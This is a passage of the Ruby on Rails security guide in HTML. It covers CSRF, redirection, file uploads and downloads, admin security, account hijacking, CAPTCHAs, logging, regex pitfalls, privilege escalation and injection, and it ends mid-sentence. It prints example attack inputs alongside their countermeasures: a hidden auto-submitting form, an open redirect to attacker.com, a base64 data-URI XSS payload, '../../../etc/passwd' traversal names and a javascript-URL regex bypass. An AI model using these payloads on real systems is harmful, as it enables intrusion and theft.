application at <a href="www.webapp.com">www.webapp.com</a> verifies the
user information in the corresponding session hash and destroys the project
with the ID 1. It then returns a result page which is an unexpected result
for the browser, so it will not display the image.  Bob doesn&#39;t notice
the attack - but a few days later he finds out that project number one is
gone.</p>

<p>It is important to notice that the actual crafted image or link doesn&#39;t
necessarily have to be situated in the web application&#39;s domain, it can
be anywhere - in a forum, blog post or email.</p>

<p>CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) -
less than 0.1% in 2006 - but it really is a &#39;sleeping giant&#39;
[Grossman]. This is in stark contrast to the results in many security
contract works - <em>CSRF is an important security issue</em>.</p>

<h3 id="label-CSRF+Countermeasures">CSRF Countermeasures<span><a href="#label-CSRF+Countermeasures">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>First, as is required by the W3C, use GET and POST appropriately.
Secondly, a security token in non-GET requests will protect your
application from CSRF.</em></p>

<p>The HTTP protocol basically provides two main types of requests - GET and
POST (and more, but they are not supported by most browsers). The World
Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or
POST:</p>

<p><em>Use GET if:</em>*</p>

<p>The interaction is more <em>like a question</em> (i.e., it is a safe
operation such as a query, read operation, or lookup).</p>

<p><em>Use POST if:</em>*</p>

<p>The interaction is more <em>like an order</em>, or  The interaction
<em>changes the state</em> of the resource in a way that the user would
perceive (e.g., a subscription to a service), or  The user is <em>held
accountable for the results</em> of the interaction.</p>

<p>If your web application is RESTful, you might be used to additional HTTP
verbs, such as PATCH, PUT or DELETE. Most of today&#39;s web browsers,
however do not support them - only GET and POST. Rails uses a hidden
<code>_method</code> field to handle this barrier.</p>

<p><em>POST requests can be sent automatically, too</em>. Here is an example
for a link which displays <a href="www.harmless.com">www.harmless.com</a>
as destination in the browser&#39;s status bar. In fact it dynamically
creates a new form that sends a POST request.</p>

<pre>&lt;a href=&quot;http://www.harmless.com/&quot; onclick=&quot;
  var f = document.createElement(&#39;form&#39;);
  f.style.display = &#39;none&#39;;
  this.parentNode.appendChild(f);
  f.method = &#39;POST&#39;;
  f.action = &#39;http://www.example.com/account/destroy&#39;;
  f.submit();
  return false;&quot;&gt;To the harmless survey&lt;/a&gt;</pre>

<p>Or the attacker places the code into the onmouseover event handler of an
image:</p>

<pre>&lt;img src=&quot;http://www.harmless.com/img&quot; width=&quot;400&quot; height=&quot;400&quot; onmouseover=&quot;...&quot; /&gt;</pre>

<p>There are many other possibilities, like using a
<code>&lt;script&gt;</code> tag to make a cross-site request to a URL with
a JSONP or JavaScript response. The response is executable code that the
attacker can find a way to run, possibly extracting sensitive data. To
protect against this data leakage, we disallow cross-site
<code>&lt;script&gt;</code> tags. Only Ajax requests may have JavaScript
responses since XmlHttpRequest is subject to the browser Same-Origin policy
- meaning only your site can initiate the request.</p>

<p>To protect against all other forged requests, we introduce a <em>required
security token</em> that our site knows but other sites don&#39;t know. We
include the security token in requests and verify it on the server. This is
a one-liner in your application controller, and is the default for newly
created rails applications:</p>

<pre class="ruby"><span class="ruby-identifier">protect_from_forgery</span> <span class="ruby-identifier">with</span><span class="ruby-operator">:</span> :<span class="ruby-identifier">exception</span>
</pre>

<p>This will automatically include a security token in all forms and Ajax
requests generated by Rails. If the security token doesn&#39;t match what
was expected, an exception will be thrown.</p>

<p>It is common to use persistent cookies to store user information, with
<code>cookies.permanent</code> for example. In this case, the cookies will
not be cleared and the out of the box CSRF protection will not be
effective. If you are using a different cookie store than the session for
this information, you must handle what to do with it yourself:</p>

<pre class="ruby"><span class="ruby-identifier">rescue_from</span> <span class="ruby-constant">ActionController</span><span class="ruby-operator">::</span><span class="ruby-constant">InvalidAuthenticityToken</span> <span class="ruby-keyword">do</span> <span class="ruby-operator">|</span><span class="ruby-identifier">exception</span><span class="ruby-operator">|</span>
  <span class="ruby-identifier">sign_out_user</span> <span class="ruby-comment"># Example method that will destroy the user cookies</span>
<span class="ruby-keyword">end</span>
</pre>

<p>The above method can be placed in the <code>ApplicationController</code>
and will be called when a CSRF token is not present or is incorrect on a
non-GET request.</p>

<p>Note that <em>cross-site scripting (XSS) vulnerabilities bypass all CSRF
protections</em>. XSS gives the attacker access to all elements on a page,
so they can read the CSRF security token from a form or directly submit the
form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.</p>

<h2 id="label-Redirection+and+Files">Redirection and Files<span><a href="#label-Redirection+and+Files">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>Another class of security vulnerabilities surrounds the use of redirection
and files in web applications.</p>

<h3 id="label-Redirection">Redirection<span><a href="#label-Redirection">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>WARNING: <em>Redirection in a web application is an underestimated cracker
tool: Not only can the attacker forward the user to a trap web site, they
may also create a self-contained attack.</em></p>

<p>Whenever the user is allowed to pass (parts of) the URL for redirection, it
is possibly vulnerable. The most obvious attack would be to redirect users
to a fake web application which looks and feels exactly as the original
one. This so-called phishing attack works by sending an unsuspicious link
in an email to the users, injecting the link by XSS in the web application
or putting the link into an external site. It is unsuspicious, because the
link starts with the URL to the web application and the URL to the
malicious site is hidden in the redirection parameter: <a
href="http://www.example.com/site/redirect?to">www.example.com/site/redirect?to</a>=
<a href="www.attacker.com.">www.attacker.com.</a> Here is an example of a
legacy action:</p>

<pre class="ruby"><span class="ruby-keyword">def</span> <span class="ruby-identifier">legacy</span>
  <span class="ruby-identifier">redirect_to</span>(<span class="ruby-identifier">params</span>.<span class="ruby-identifier">update</span>(<span class="ruby-identifier">action</span>:<span class="ruby-string">&#39;main&#39;</span>))
<span class="ruby-keyword">end</span>
</pre>

<p>This will redirect the user to the main action if they tried to access a
legacy action. The intention was to preserve the URL parameters to the
legacy action and pass them to the main action. However, it can be
exploited by attacker if they included a host key in the URL:</p>

<pre>http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com</pre>

<p>If it is at the end of the URL it will hardly be noticed and redirects the
user to the attacker.com host. A simple countermeasure would be to
<em>include only the expected parameters in a legacy action</em> (again a
whitelist approach, as opposed to removing unexpected parameters). <em>And
if you redirect to an URL, check it with a whitelist or a regular
expression</em>.</p>

<h4 id="label-Self-contained+XSS">Self-contained XSS<span><a href="#label-Self-contained+XSS">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>Another redirection and self-contained XSS attack works in Firefox and
Opera by the use of the data protocol. This protocol displays its contents
directly in the browser and can be anything from HTML or JavaScript to
entire images:</p>

<p><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code></p>

<p>This example is a Base64 encoded JavaScript which displays a simple message
box. In a redirection URL, an attacker could redirect to this URL with the
malicious code in it. As a countermeasure, <em>do not allow the user to
supply (parts of) the URL to be redirected to</em>.</p>

<h3 id="label-File+Uploads">File Uploads<span><a href="#label-File+Uploads">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>Make sure file uploads don&#39;t overwrite important files, and
process media files asynchronously.</em></p>

<p>Many web applications allow users to upload files. <em>File names, which
the user may choose (partly), should always be filtered</em> as an attacker
could use a malicious file name to overwrite any file on the server. If you
store file uploads at /var/www/uploads, and the user enters a file name
like “../../../etc/passwd”, it may overwrite an important file. Of course,
the Ruby interpreter would need the appropriate permissions to do so - one
more reason to run web servers, database servers and other programs as a
less privileged Unix user.</p>

<p>When filtering user input file names, <em>don&#39;t try to remove malicious
parts</em>. Think of a situation where the web application removes all
“../” in a file name and an attacker uses a string such as “.…//” - the
result will be “../”. It is best to use a whitelist approach, which
<em>checks for the validity of a file name with a set of accepted
characters</em>. This is opposed to a blacklist approach which attempts to
remove not allowed characters. In case it isn&#39;t a valid file name,
reject it (or replace not accepted characters), but don&#39;t remove them.
Here is the file name sanitizer from the <a
href="https://github.com/technoweenie/attachment_fu/tree/master">attachment_fu
plugin</a>:</p>

<pre class="ruby"><span class="ruby-keyword">def</span> <span class="ruby-identifier">sanitize_filename</span>(<span class="ruby-identifier">filename</span>)
  <span class="ruby-identifier">filename</span>.<span class="ruby-identifier">strip</span>.<span class="ruby-identifier">tap</span> <span class="ruby-keyword">do</span> <span class="ruby-operator">|</span><span class="ruby-identifier">name</span><span class="ruby-operator">|</span>
    <span class="ruby-comment"># NOTE: File.basename doesn&#39;t work right with Windows paths on Unix</span>
    <span class="ruby-comment"># get only the filename, not the whole path</span>
    <span class="ruby-identifier">name</span>.<span class="ruby-identifier">sub!</span> <span class="ruby-regexp">/\A.*(\|\/)/</span>, <span class="ruby-string">&#39;&#39;</span>
    <span class="ruby-comment"># Finally, replace all non alphanumeric, underscore</span>
    <span class="ruby-comment"># or periods with underscore</span>
    <span class="ruby-identifier">name</span>.<span class="ruby-identifier">gsub!</span> <span class="ruby-regexp">/[^\w\.\-]/</span>, <span class="ruby-string">&#39;_&#39;</span>
  <span class="ruby-keyword">end</span>
<span class="ruby-keyword">end</span>
</pre>

<p>A significant disadvantage of synchronous processing of file uploads (as
the attachment_fu plugin may do with images), is its <em>vulnerability to
denial-of-service attacks</em>. An attacker can synchronously start image
file uploads from many computers which increases the server load and may
eventually crash or stall the server.</p>

<p>The solution to this is best to <em>process media files
asynchronously</em>: Save the media file and schedule a processing request
in the database. A second process will handle the processing of the file in
the background.</p>

<h3 id="label-Executable+Code+in+File+Uploads">Executable Code in File Uploads<span><a href="#label-Executable+Code+in+File+Uploads">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>WARNING: <em>Source code in uploaded files may be executed when placed in
specific directories. Do not place file uploads in Rails&#39; /public
directory if it is Apache&#39;s home directory.</em></p>

<p>The popular Apache web server has an option called DocumentRoot. This is
the home directory of the web site, everything in this directory tree will
be served by the web server. If there are files with a certain file name
extension, the code in it will be executed when requested (might require
some options to be set). Examples for this are PHP and CGI files. Now think
of a situation where an attacker uploads a file “file.cgi” with code in it,
which will be executed when someone downloads the file.</p>

<p><em>If your Apache DocumentRoot points to Rails&#39; /public directory, do
not put file uploads in it</em>, store files at least one level downwards.</p>

<h3 id="label-File+Downloads">File Downloads<span><a href="#label-File+Downloads">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>Make sure users cannot download arbitrary files.</em></p>

<p>Just as you have to filter file names for uploads, you have to do so for
downloads. The send_file() method sends files from the server to the
client. If you use a file name, that the user entered, without filtering,
any file can be downloaded:</p>

<pre class="ruby"><span class="ruby-identifier">send_file</span>(<span class="ruby-string">&#39;/var/www/uploads/&#39;</span> <span class="ruby-operator">+</span> <span class="ruby-identifier">params</span>[:<span class="ruby-identifier">filename</span>])
</pre>

<p>Simply pass a file name like “../../../etc/passwd” to download the
server&#39;s login information. A simple solution against this, is to
<em>check that the requested file is in the expected directory</em>:</p>

<pre class="ruby"><span class="ruby-identifier">basename</span> = <span class="ruby-constant">File</span>.<span class="ruby-identifier">expand_path</span>(<span class="ruby-constant">File</span>.<span class="ruby-identifier">join</span>(<span class="ruby-constant">File</span>.<span class="ruby-identifier">dirname</span>(<span class="ruby-keyword">__FILE__</span>), <span class="ruby-string">&#39;../../files&#39;</span>))
<span class="ruby-identifier">filename</span> = <span class="ruby-constant">File</span>.<span class="ruby-identifier">expand_path</span>(<span class="ruby-constant">File</span>.<span class="ruby-identifier">join</span>(<span class="ruby-identifier">basename</span>, <span class="ruby-ivar">@file</span>.<span class="ruby-identifier">public_filename</span>))
<span class="ruby-identifier">raise</span> <span class="ruby-keyword">if</span> <span class="ruby-identifier">basename</span> <span class="ruby-operator">!=</span>
     <span class="ruby-constant">File</span>.<span class="ruby-identifier">expand_path</span>(<span class="ruby-constant">File</span>.<span class="ruby-identifier">join</span>(<span class="ruby-constant">File</span>.<span class="ruby-identifier">dirname</span>(<span class="ruby-identifier">filename</span>), <span class="ruby-string">&#39;../../../&#39;</span>))
<span class="ruby-identifier">send_file</span> <span class="ruby-identifier">filename</span>, <span class="ruby-identifier">disposition</span><span class="ruby-operator">:</span> <span class="ruby-string">&#39;inline&#39;</span>
</pre>

<p>Another (additional) approach is to store the file names in the database
and name the files on the disk after the ids in the database. This is also
a good approach to avoid possible code in an uploaded file to be executed.
The attachment_fu plugin does this in a similar way.</p>

<h2 id="label-Intranet+and+Admin+Security">Intranet and Admin Security<span><a href="#label-Intranet+and+Admin+Security">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>Intranet and administration interfaces are popular attack targets, because
they allow privileged access. Although this would require several
extra-security measures, the opposite is the case in the real world.</p>

<p>In 2007 there was the first tailor-made trojan which stole information from
an Intranet, namely the “Monster for employers” web site of Monster.com, an
online recruitment web application. Tailor-made Trojans are very rare, so
far, and the risk is quite low, but it is certainly a possibility and an
example of how the security of the client host is important, too. However,
the highest threat to Intranet and Admin applications are XSS and CSRF.</p>

<p><em>XSS</em>* If your application re-displays malicious user input from the
extranet, the application will be vulnerable to XSS. User names, comments,
spam reports, order addresses are just a few uncommon examples, where there
can be XSS.</p>

<p>Having one single place in the admin interface or Intranet, where the input
has not been sanitized, makes the entire application vulnerable. Possible
exploits include stealing the privileged administrator&#39;s cookie,
injecting an iframe to steal the administrator&#39;s password or installing
malicious software through browser security holes to take over the
administrator&#39;s computer.</p>

<p>Refer to the Injection section for countermeasures against XSS. It is
<em>recommended to use the SafeErb plugin</em> also in an Intranet or
administration interface.</p>

<p><em>CSRF</em>* Cross-Site Request Forgery (CSRF), also known as Cross-Site
Reference Forgery (XSRF), is a gigantic attack method, it allows the
attacker to do everything the administrator or Intranet user may do. As you
have already seen above how CSRF works, here are a few examples of what
attackers can do in the Intranet or admin interface.</p>

<p>A real-world example is a <a
href="http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html">router
reconfiguration by CSRF</a>. The attackers sent a malicious e-mail, with
CSRF in it, to Mexican users. The e-mail claimed there was an e-card
waiting for them, but it also contained an image tag that resulted in a
HTTP-GET request to reconfigure the user&#39;s router (which is a popular
model in Mexico). The request changed the DNS-settings so that requests to
a Mexico-based banking site would be mapped to the attacker&#39;s site.
Everyone who accessed the banking site through that router saw the
attacker&#39;s fake web site and had their credentials stolen.</p>

<p>Another example changed Google Adsense&#39;s e-mail address and password
by. If the victim was logged into Google Adsense, the administration
interface for Google advertisements campaigns, an attacker could change
their credentials.</p>

<p>Another popular attack is to spam your web application, your blog or forum
to propagate malicious XSS. Of course, the attacker has to know the URL
structure, but most Rails URLs are quite straightforward or they will be
easy to find out, if it is an open-source application&#39;s admin
interface. The attacker may even do 1,000 lucky guesses by just including
malicious IMG-tags which try every possible combination.</p>

<p>For <em>countermeasures against CSRF in administration interfaces and
Intranet applications, refer to the countermeasures in the CSRF
section</em>.</p>

<h3 id="label-Additional+Precautions">Additional Precautions<span><a href="#label-Additional+Precautions">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>The common admin interface works like this: it&#39;s located at <a
href="www.example.com/admin">www.example.com/admin</a>, may be accessed
only if the admin flag is set in the User model, re-displays user input and
allows the admin to delete/add/edit whatever data desired. Here are some
thoughts about this:</p>

<p>It is very important to <em>think about the worst case</em>: What if
someone really got hold of your cookies or user credentials. You could
<em>introduce roles</em> for the admin interface to limit the possibilities
of the attacker. Or how about <em>special login credentials</em> for the
admin interface, other than the ones used for the public part of the
application. Or a <em>special password for very serious actions</em>?</p>

<p>Does the admin really have to access the interface from everywhere in the
world? Think about <em>limiting the login to a bunch of source IP
addresses</em>. Examine request.remote_ip to find out about the user&#39;s
IP address. This is not bullet-proof, but a great barrier. Remember that
there might be a proxy in use, though.</p>

<p><em>Put the admin interface to a special sub-domain</em> such as
admin.application.com and make it a separate application with its own user
management. This makes stealing an admin cookie from the usual domain, <a
href="www.application.com">www.application.com</a>, impossible. This is
because of the same origin policy in your browser: An injected (XSS) script
on <a href="www.application.com">www.application.com</a> may not read the
cookie for admin.application.com and vice-versa.</p>

<h2 id="label-User+Management">User Management<span><a href="#label-User+Management">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>NOTE: <em>Almost every web application has to deal with authorization and
authentication. Instead of rolling your own, it is advisable to use common
plug-ins. But keep them up-to-date, too. A few additional precautions can
make your application even more secure.</em></p>

<p>There are a number of authentication plug-ins for Rails available. Good
ones, such as the popular <a
href="https://github.com/plataformatec/devise">devise</a> and <a
href="https://github.com/binarylogic/authlogic">authlogic</a>, store only
encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the
built-in <code>has_secure_password</code> method which has similar
features.</p>

<p>Every new user gets an activation code to activate their account when they
get an e-mail with a link in it. After activating the account, the
activation_code columns will be set to NULL in the database. If someone
requested an URL like these, they would be logged in as the first activated
user found in the database (and chances are that this is the
administrator):</p>

<pre>http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=</pre>

<p>This is possible because on some servers, this way the parameter id, as in
<a href=":id">params</a>, would be nil. However, here is the finder from
the activation action:</p>

<pre class="ruby"><span class="ruby-constant">User</span>.<span class="ruby-identifier">find_by_activation_code</span>(<span class="ruby-identifier">params</span>[:<span class="ruby-identifier">id</span>])
</pre>

<p>If the parameter was nil, the resulting SQL query will be</p>

<pre>SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1</pre>

<p>And thus it found the first user in the database, returned it and logged
them in. You can find out more about it in <a
href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">this
blog post</a>. <em>It is advisable to update your plug-ins from time to
time</em>. Moreover, you can review your application to find more flaws
like this.</p>

<h3 id="label-Brute-Forcing+Accounts">Brute-Forcing Accounts<span><a href="#label-Brute-Forcing+Accounts">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>Brute-force attacks on accounts are trial and error attacks on
the login credentials. Fend them off with more generic error messages and
possibly require to enter a CAPTCHA.</em></p>

<p>A list of user names for your web application may be misused to brute-force
the corresponding passwords, because most people don&#39;t use
sophisticated passwords. Most passwords are a combination of dictionary
words and possibly numbers. So armed with a list of user names and a
dictionary, an automatic program may find the correct password in a matter
of minutes.</p>

<p>Because of this, most web applications will display a generic error message
“user name or password not correct”, if one of these are not correct. If it
said “the user name you entered has not been found”, an attacker could
automatically compile a list of user names.</p>

<p>However, what most web application designers neglect, are the
forgot-password pages. These pages often admit that the entered user name
or e-mail address has (not) been found. This allows an attacker to compile
a list of user names and brute-force the accounts.</p>

<p>In order to mitigate such attacks, <em>display a generic error message on
forgot-password pages, too</em>. Moreover, you can <em>require to enter a
CAPTCHA after a number of failed logins from a certain IP address</em>.
Note, however, that this is not a bullet-proof solution against automatic
programs, because these programs may change their IP address exactly as
often. However, it raises the barrier of an attack.</p>

<h3 id="label-Account+Hijacking">Account Hijacking<span><a href="#label-Account+Hijacking">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>Many web applications make it easy to hijack user accounts. Why not be
different and make it more difficult?.</p>

<h4 id="label-Passwords">Passwords<span><a href="#label-Passwords">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>Think of a situation where an attacker has stolen a user&#39;s session
cookie and thus may co-use the application. If it is easy to change the
password, the attacker will hijack the account with a few clicks. Or if the
change-password form is vulnerable to CSRF, the attacker will be able to
change the victim&#39;s password by luring them to a web page where there
is a crafted IMG-tag which does the CSRF. As a countermeasure, <em>make
change-password forms safe against CSRF</em>, of course. And <em>require
the user to enter the old password when changing it</em>.</p>

<h4 id="label-E-Mail">E-Mail<span><a href="#label-E-Mail">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>However, the attacker may also take over the account by changing the e-mail
address. After they change it, they will go to the forgotten-password page
and the (possibly new) password will be mailed to the attacker&#39;s e-mail
address. As a countermeasure <em>require the user to enter the password
when changing the e-mail address, too</em>.</p>

<h4 id="label-Other">Other<span><a href="#label-Other">&para;</a> <a href="#top">&uarr;</a></span></h4>

<p>Depending on your web application, there may be more ways to hijack the
user&#39;s account. In many cases CSRF and XSS will help to do so. For
example, as in a CSRF vulnerability in <a
href="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google
Mail</a>. In this proof-of-concept attack, the victim would have been lured
to a web site controlled by the attacker. On that site is a crafted IMG-tag
which results in a HTTP GET request that changes the filter settings of
Google Mail. If the victim was logged in to Google Mail, the attacker would
change the filters to forward all e-mails to their e-mail address. This is
nearly as harmful as hijacking the entire account. As a countermeasure,
<em>review your application logic and eliminate all XSS and CSRF
vulnerabilities</em>.</p>

<h3 id="label-CAPTCHAs">CAPTCHAs<span><a href="#label-CAPTCHAs">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>INFO: <em>A CAPTCHA is a challenge-response test to determine that the
response is not generated by a computer. It is often used to protect
comment forms from automatic spam bots by asking the user to type the
letters of a distorted image. The idea of a negative CAPTCHA is not for a
user to prove that they are human, but reveal that a robot is a robot.</em></p>

<p>But not only spam robots (bots) are a problem, but also automatic login
bots. A popular CAPTCHA API is <a
href="http://recaptcha.net/">reCAPTCHA</a> which displays two distorted
images of words from old books. It also adds an angled line, rather than a
distorted background and high levels of warping on the text as earlier
CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA
helps to digitize old books. <a
href="https://github.com/ambethia/recaptcha/">ReCAPTCHA</a> is also a Rails
plug-in with the same name as the API.</p>

<p>You will get two keys from the API, a public and a private key, which you
have to put into your Rails environment. After that you can use the
recaptcha_tags method in the view, and the verify_recaptcha method in the
controller. Verify_recaptcha will return false if the validation fails. The
problem with CAPTCHAs is, they are annoying. Additionally, some visually
impaired users have found certain kinds of distorted CAPTCHAs difficult to
read. The idea of negative CAPTCHAs is not to ask a user to proof that they
are human, but reveal that a spam robot is a bot.</p>

<p>Most bots are really dumb, they crawl the web and put their spam into every
form&#39;s field they can find. Negative CAPTCHAs take advantage of that
and include a “honeypot” field in the form which will be hidden from the
human user by CSS or JavaScript.</p>

<p>Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:</p>

<p>position the fields off of the visible area of the page  make the elements
very small or color them the same as the background of the page  leave the
fields displayed, but tell humans to leave them blank</p>

<p>The most simple negative CAPTCHA is one hidden honeypot field. On the
server side, you will check the value of the field: If it contains any
text, it must be a bot. Then, you can either ignore the post or return a
positive result, but not saving the post to the database. This way the bot
will be satisfied and moves on. You can do this with annoying users, too.</p>

<p>You can find more sophisticated negative CAPTCHAs in Ned Batchelder&#39;s
<a href="http://nedbatchelder.com/text/stopbots.html">blog post</a>:</p>

<p>Include a field with the current UTC time-stamp in it and check it on the
server. If it is too far in the past, or if it is in the future, the form
is invalid.  Randomize the field names  Include more than one honeypot
field of all types, including submission buttons</p>

<p>Note that this protects you only from automatic bots, targeted tailor-made
bots cannot be stopped by this. So <em>negative CAPTCHAs might not be good
to protect login forms</em>.</p>

<h3 id="label-Logging">Logging<span><a href="#label-Logging">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>WARNING: <em>Tell Rails not to put passwords in the log files.</em></p>

<p>By default, Rails logs all requests being made to the web application. But
log files can be a huge security issue, as they may contain login
credentials, credit card numbers et cetera. When designing a web
application security concept, you should also think about what will happen
if an attacker got (full) access to the web server. Encrypting secrets and
passwords in the database will be quite useless, if the log files list them
in clear text. You can <em>filter certain request parameters from your log
files</em> by appending them to <code>config.filter_parameters</code> in
the application configuration. These parameters will be marked [FILTERED]
in the log.</p>

<pre class="ruby"><span class="ruby-identifier">config</span>.<span class="ruby-identifier">filter_parameters</span> <span class="ruby-operator">&lt;&lt;</span> :<span class="ruby-identifier">password</span>
</pre>

<h3 id="label-Good+Passwords">Good Passwords<span><a href="#label-Good+Passwords">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>INFO: <em>Do you find it hard to remember all your passwords? Don&#39;t
write them down, but use the initial letters of each word in an easy to
remember sentence.</em></p>

<p>Bruce Schneier, a security technologist, <a
href="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html">has
analyzed</a> 34,000 real-world user names and passwords from the MySpace
phishing attack mentioned <a
href="#examples-from-the-underground">below</a>. It turns out that most of
the passwords are quite easy to crack. The 20 most common passwords are:</p>

<p>password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc,
baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1,
jordan23, slipknot1, superman1, iloveyou1, and monkey.</p>

<p>It is interesting that only 4% of these passwords were dictionary words and
the great majority is actually alphanumeric. However, password cracker
dictionaries contain a large number of today&#39;s passwords, and they try
out all kinds of (alphanumerical) combinations. If an attacker knows your
user name and you use a weak password, your account will be easily cracked.</p>

<p>A good password is a long alphanumeric combination of mixed cases. As this
is quite hard to remember, it is advisable to enter only the <em>first
letters of a sentence that you can easily remember</em>. For example “The
quick brown fox jumps over the lazy dog” will be “Tqbfjotld”. Note that
this is just an example, you should not use well known phrases like these,
as they might appear in cracker dictionaries, too.</p>

<h3 id="label-Regular+Expressions">Regular Expressions<span><a href="#label-Regular+Expressions">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>INFO: <em>A common pitfall in Ruby&#39;s regular expressions is to match
the string&#39;s beginning and end by ^ and $, instead of A and z.</em></p>

<p>Ruby uses a slightly different approach than many other languages to match
the end and the beginning of a string. That is why even many Ruby and Rails
books get this wrong. So how is this a security threat? Say you wanted to
loosely validate a URL field and you used a simple regular expression like
this:</p>

<pre class="ruby"><span class="ruby-regexp">/^https?:\/\/[^\n]+$/i</span>
</pre>

<p>This may work fine in some languages. However, <em>in Ruby ^ and $ match
the <strong>line</strong> beginning and line end</em>. And thus a URL like
this passes the filter without problems:</p>

<pre>javascript:exploit_code();  
http://hi.com</pre>

<p>This URL passes the filter because the regular expression matches - the
second line, the rest does not matter. Now imagine we had a view that
showed the URL like this:</p>

<pre class="ruby"><span class="ruby-identifier">link_to</span> <span class="ruby-string">&quot;Homepage&quot;</span>, <span class="ruby-ivar">@user</span>.<span class="ruby-identifier">homepage</span>
</pre>

<p>The link looks innocent to visitors, but when it&#39;s clicked, it will
execute the JavaScript function “exploit_code” or any other JavaScript the
attacker provides.</p>

<p>To fix the regular expression, A and z should be used instead of ^ and $,
like so:</p>

<pre class="ruby"><span class="ruby-regexp">/\Ahttps?:\/\/[^\n]+\z/i</span>
</pre>

<p>Since this is a frequent mistake, the format validator
(validates_format_of) now raises an exception if the provided regular
expression starts with ^ or ends with $. If you do need to use ^ and $
instead of A and z (which is rare), you can set the :multiline option to
true, like so:</p>

<pre class="ruby"><span class="ruby-comment"># content should include a line &quot;Meanwhile&quot; anywhere in the string</span>
  <span class="ruby-identifier">validates</span> :<span class="ruby-identifier">content</span>, <span class="ruby-identifier">format</span><span class="ruby-operator">:</span> { <span class="ruby-identifier">with</span><span class="ruby-operator">:</span> <span class="ruby-regexp">/^Meanwhile$/</span>, <span class="ruby-identifier">multiline</span><span class="ruby-operator">:</span> <span class="ruby-keyword">true</span> }
</pre>

<p>Note that this only protects you against the most common mistake when using
the format validator - you always need to keep in mind that ^ and $ match
the <strong>line</strong> beginning and line end in Ruby, and not the
beginning and end of a string.</p>

<h3 id="label-Privilege+Escalation">Privilege Escalation<span><a href="#label-Privilege+Escalation">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>WARNING: <em>Changing a single parameter may give the user unauthorized
access. Remember that every parameter may be changed, no matter how much
you hide or obfuscate it.</em></p>

<p>The most common parameter that a user might tamper with, is the id
parameter, as in <code>http://www.domain.com/project/1</code>, whereas 1 is
the id. It will be available in params in the controller. There, you will
most likely do something like this:</p>

<pre class="ruby"><span class="ruby-ivar">@project</span> = <span class="ruby-constant">Project</span>.<span class="ruby-identifier">find</span>(<span class="ruby-identifier">params</span>[:<span class="ruby-identifier">id</span>])
</pre>

<p>This is alright for some web applications, but certainly not if the user is
not authorized to view all projects. If the user changes the id to 42, and
they are not allowed to see that information, they will have access to it
anyway. Instead, <em>query the user&#39;s access rights, too</em>:</p>

<pre class="ruby"><span class="ruby-ivar">@project</span> = <span class="ruby-ivar">@current_user</span>.<span class="ruby-identifier">projects</span>.<span class="ruby-identifier">find</span>(<span class="ruby-identifier">params</span>[:<span class="ruby-identifier">id</span>])
</pre>

<p>Depending on your web application, there will be many more parameters the
user can tamper with. As a rule of thumb, <em>no user input data is secure,
until proven otherwise, and every parameter from the user is potentially
manipulated</em>.</p>

<p>Don&#39;t be fooled by security by obfuscation and JavaScript security. The
Web Developer Toolbar for Mozilla Firefox lets you review and change every
form&#39;s hidden fields. <em>JavaScript can be used to validate user input
data, but certainly not to prevent attackers from sending malicious
requests with unexpected values</em>. The Live Http Headers plugin for
Mozilla Firefox logs every request and may repeat and change them. That is
an easy way to bypass any JavaScript validations. And there are even
client-side proxies that allow you to intercept any request and response
from and to the Internet.</p>

<h2 id="label-Injection">Injection<span><a href="#label-Injection">&para;</a> <a href="#top">&uarr;</a></span></h2>

<p>INFO: <em>Injection is a class of attacks that introduce malicious code or
parameters into a web application in order to run it within its security
context. Prominent examples of injection are cross-site scripting (XSS) and
SQL injection.</em></p>

<p>Injection is very tricky, because the same code or parameter can be
malicious in one context, but totally harmless in another. A context can be
a scripting, query or programming language, the shell or a Ruby/Rails
method. The following sections will cover all important contexts where
injection attacks may happen. The first section, however, covers an
architectural decision in connection with Injection.</p>

<h3 id="label-Whitelists+versus+Blacklists">Whitelists versus Blacklists<span><a href="#label-Whitelists+versus+Blacklists">&para;</a> <a href="#top">&uarr;</a></span></h3>

<p>NOTE: <em>When sanitizing, protecting or verifying something, prefer
whitelists over blacklists.</em></p>

<p>A blacklist can be a list of bad e-mail addresses, non-public actions or
bad HTML tags. This is opposed to a whitelist which lists the good e-mail
addresses, public actions, good HTML tags and so on. Although sometimes it
is not possible to create a whitelist (in a SPAM filter, for example),
<em>prefer to use whitelist approaches</em>:</p>

<p>Use before_action only: […] instead of except: […]. This way you don&#39;t
forget to turn it off for newly added actions.  Allow &lt;strong&gt;
instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See
below for details.  Don&#39;t try to correct user input by blacklists: 
This will make the attack work:
